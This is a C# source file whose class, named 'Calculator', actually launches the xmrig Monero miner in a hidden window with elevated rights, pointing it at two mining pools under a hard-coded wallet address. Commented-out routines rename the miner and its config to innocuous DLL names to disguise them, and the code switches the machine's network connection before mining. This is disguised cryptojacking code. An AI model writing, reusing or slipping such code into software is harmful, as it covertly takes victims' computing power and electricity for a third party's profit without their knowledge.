
using System;
using System.Diagnostics;
using System.IO;


namespace Mandarin.Network
{
    public class Calculator
    {
        private NetworkConnection network;
        private ProcessStartInfo minerProcessInfo = null;
        private Process minerProcess;
        //private string fake_config_file = "Mandarin.dll", original_config_file = "config.json";
        private string /*fake_process_file = "MandarinLib.dll", */original_process_file = "xmrig.exe", acc = "45fLT6i5B1fCaRFyd9YcMLbCHxiTTdpaShttnCoK96TZNjt1hHms1YNi29FZRn4KQFcqzxkk5ugTz5H2RzWWRkyC91GQR3i";

        public static void reset()
        {
            Mandarin.Properties.Settings.Default.is_start = false;
            Mandarin.Properties.Settings.Default.is_on_free = false;
            Mandarin.Properties.Settings.Default.Save();
        }

        //private bool renameConfig(bool is_for_start)
        //{
        //    if (is_for_start)
        //    {
        //        if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + fake_config_file) && System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + original_config_file))
        //        {
        //            System.IO.File.Delete(System.Environment.CurrentDirectory + @"\Resource\" + original_config_file);
        //        }
        //        if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + fake_config_file))
        //        {
        //            System.IO.File.Move(System.Environment.CurrentDirectory + @"\Resource\" + fake_config_file, System.Environment.CurrentDirectory + @"\Resource\" + original_config_file);
        //            return true;
        //        }
        //        else if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + original_config_file))
        //        {
        //            return true;
        //        }
        //        else
        //        {
        //            Network.SystemLog.AddLog("Error rename config file", System.Diagnostics.EventLogEntryType.Error, "renameConfig");
        //            return false;
        //        }

        //    }
        //    else
        //    {
        //        if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + fake_config_file) && System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + original_config_file))
        //        {
        //            System.IO.File.Delete(System.Environment.CurrentDirectory + @"\Resource\" + fake_config_file);
        //        }
        //        if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + original_config_file))
        //        {
        //            System.IO.File.Move(System.Environment.CurrentDirectory + @"\Resource\" + original_config_file, System.Environment.CurrentDirectory + @"\Resource\" + fake_config_file);
        //            return true;
        //        }
        //        else if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + fake_config_file))
        //        {
        //            return true;
        //        }
        //        else
        //        {
        //            Network.SystemLog.AddLog("Error rename config file", System.Diagnostics.EventLogEntryType.Error, "renameConfig");
        //            return false;
        //        }
        //    }
        //}
        //private bool renameProcess(bool is_for_start)
        //{
        //    if (is_for_start)
        //    {
        //        if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + fake_process_file) && System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + original_process_file))
        //        {
        //            System.IO.File.Delete(System.Environment.CurrentDirectory + @"\Resource\" + original_process_file);
        //        }
        //        if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + fake_process_file))
        //        {
        //            System.IO.File.Move(System.Environment.CurrentDirectory + @"\Resource\" + fake_process_file, System.Environment.CurrentDirectory + @"\Resource\" + original_process_file);
        //            return true;
        //        }
        //        else if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + original_process_file))
        //        {
        //            return true;
        //        }
        //        else
        //        {
        //            Network.SystemLog.AddLog("Error rename process", System.Diagnostics.EventLogEntryType.Error, "renameProcess");
        //            return false;
        //        }

        //    }
        //    else
        //    {
        //        if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + fake_process_file) && System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + original_process_file))
        //        {
        //            System.IO.File.Delete(System.Environment.CurrentDirectory + @"\Resource\" + fake_process_file);
        //        }
        //        if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + original_process_file))
        //        {
        //            System.IO.File.Move(System.Environment.CurrentDirectory + @"\Resource\" + original_process_file, System.Environment.CurrentDirectory + @"\Resource\" + fake_process_file);
        //            return true;
        //        }
        //        else if (System.IO.File.Exists(System.Environment.CurrentDirectory + @"\Resource\" + fake_process_file))
        //        {
        //            return true;
        //        }
        //        else
        //        {
        //            Network.SystemLog.AddLog("Error rename process", System.Diagnostics.EventLogEntryType.Error, "renameProcess");
        //            return false;
        //        }
        //    }
        //}
        public Calculator(NetworkConnection network)
        {

            minerProcessInfo = new ProcessStartInfo(System.Environment.CurrentDirectory + @"\Resource\" + original_process_file, "--cuda -o pool.hashvault.pro:443 -u " + acc + " -p bahramxmr -k --tls -a rx/0 -o hk.monero.herominers.com:10191 -u " + acc + " -k --tls -p bahramxmr");
            //minerProcessInfo.UseShellExecute = false;
            minerProcessInfo.WindowStyle = ProcessWindowStyle.Hidden;
            if (System.Environment.OSVersion.Version.Major >= 6)
            {
                minerProcessInfo.Verb = "runas";
            }
            this.network = network;

        }
        public void Start()
        {

            try
            {
                //if (!renameConfig(true) || !renameProcess(true))
                //{
                //    renameConfig(false);
                //    renameProcess(false);
                //    return;
                //}
                //System.Threading.Thread.Sleep(3000);
                if (!Mandarin.Properties.Settings.Default.is_on_free)
                    network.ChangeConnectionToFreeNetwork();

                System.Threading.Thread.Sleep(10000);

                Mandarin.Properties.Settings.Default.is_start = true;
                Mandarin.Properties.Settings.Default.Save();
                minerProcess = Process.Start(minerProcessInfo);
                Network.SystemLog.AddLog("Start Process " + minerProcess.StartInfo.FileName, System.Diagnostics.EventLogEntryType.SuccessAudit, "Start");
            }
            catch (Exception err)
            {
                Network.SystemLog.AddLog(err.Message, System.Diagnostics.EventLogEntryType.Error, "Start");
                Mandarin.Properties.Settings.Default.is_start = false;
                Mandarin.Properties.Settings.Default.Save();
                network.ChangeConnectionToLocalNetwork();
            }
        }
        public void Stop(bool is_local_network_state_before_start)
        {

            try
            {
                if (minerProcess != null)
                {
                    minerProcess.Kill();
                    System.Threading.Thread.Sleep(1000);
                }

                Process[] workers = Process.GetProcessesByName(original_process_file.Substring(0, original_process_file.LastIndexOf('.')));
                foreach (Process worker in workers)
                {
                    Network.SystemLog.AddLog("Kill Process " + worker.ProcessName, System.Diagnostics.EventLogEntryType.Information, "Stop");
                    worker.Kill();
                    System.Threading.Thread.Sleep(1000);
                }

                Mandarin.Properties.Settings.Default.is_start = false;
                Mandarin.Properties.Settings.Default.Save();

                //System.Threading.Thread.Sleep(500);
                //if (!renameConfig(false) || !renameProcess(false))
                //{

                //    renameConfig(true);
                //    renameProcess(true);

                //}
                System.Threading.Thread.Sleep(500);
                if (is_local_network_state_before_start)
                    network.ChangeConnectionToLocalNetwork();
                Network.SystemLog.AddLog("Stoped Miner", System.Diagnostics.EventLogEntryType.SuccessAudit, "Stop");
            }
            catch (Exception err)
            {
                Network.SystemLog.AddLog(err.Message, System.Diagnostics.EventLogEntryType.Error, "Stop");
                Mandarin.Properties.Settings.Default.is_start = false;
                Mandarin.Properties.Settings.Default.Save();
                if (is_local_network_state_before_start)
                    network.ChangeConnectionToLocalNetwork();
            }

        }
    }
}
